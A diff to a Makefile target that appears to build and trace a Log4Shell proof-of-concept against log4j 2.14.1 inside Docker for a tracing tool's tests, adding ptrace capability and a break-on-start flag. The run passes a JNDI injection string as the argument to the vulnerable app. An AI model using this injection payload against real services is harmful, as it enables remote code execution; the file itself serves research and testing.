@@ -5,12 +5,12 @@ IMAGE_NAME := trailofbits/mttn-log4shell
 
 log4shell.trace: compile
 	make -C vulnerable-app log4shell-poc.jar
-	docker run -it --rm --security-opt seccomp=unconfined --mount type=bind,source="$(REPO_DIR)",target=/app/mttn \
+	docker run -it --rm --cap-add SYS_PTRACE --security-opt seccomp=unconfined --mount type=bind,source="$(REPO_DIR)",target=/app/mttn \
 		-e RUST_LOG=debug \
 		--workdir=/app/mttn/test/log4shell $(IMAGE_NAME) \
 		mttn --ignore-unsupported-memops java -- \
 			-cp vulnerable-app/log4shell-poc.jar:vulnerable-app/lib/log4j-api-2.14.1.jar:vulnerable-app/lib/log4j-core-2.14.1.jar \
-			com.trailofbits.log4shell.PoC '$${jndi:ldap://127.0.0.1:1337/pwn}' \
+			com.trailofbits.log4shell.PoC --break-on-start '$${jndi:ldap://127.0.0.1:1337/pwn}' \
 		> $@
 
 .PHONY: run
